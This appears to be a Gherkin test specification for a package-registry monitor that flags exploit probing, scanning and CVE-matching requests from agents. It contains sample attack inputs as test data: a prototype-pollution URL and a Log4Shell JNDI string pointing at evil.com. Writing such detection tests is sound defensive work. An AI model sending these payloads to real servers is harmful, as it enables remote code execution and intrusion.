Feature: Package Registry Monitor
  As a supply chain security analyst
  I want to monitor package registry proxy interactions across Artifactory, npm, and PyPI
  So that zero-day exploit probing, malformed requests, and CVE exploitation attempts are intercepted and recorded in RegistryThreatEvidence

  Scenario: a malformed npm package request is detected as exploit probing
    Given an agent "agent-npm-01" issuing a malformed package request "https://registry.npmjs.org/__proto__/pollute" with prototype pollution payload
    When the package registry monitor runs exploit probing detection for "agent-npm-01"
    Then registry threat evidence should be generated with registry_type "npm" and an exploit indicator

  Scenario: an unusual request sequence deviating from normal PyPI behavior is flagged
    Given an agent "agent-pypi-01" generating 8 consecutive 404 responses across nonexistent packages on "https://pypi.org"
    When the package registry monitor runs exploit probing detection for "agent-pypi-01"
    Then registry threat evidence should be generated for "PyPI" identifying unusual scanning activity

  Scenario: RegistryThreatEvidence includes the registry_type
    Given a detected registry threat evidence object for registry_type "Artifactory" and package "internal-lib"
    When inspecting the RegistryThreatEvidence model
    Then it should contain the registry_type "Artifactory" and package_name "internal-lib"

  Scenario: detected pattern matching a known CVE signature populates cve_candidates
    Given an agent "agent-cve-01" sending a request containing JNDI lookup "${jndi:ldap://evil.com/x}" to "https://artifactory.internal/api/search"
    When the package registry monitor runs exploit probing detection for "agent-cve-01"
    Then the generated registry threat evidence should populate cve_candidates containing "CVE-2021-44228"
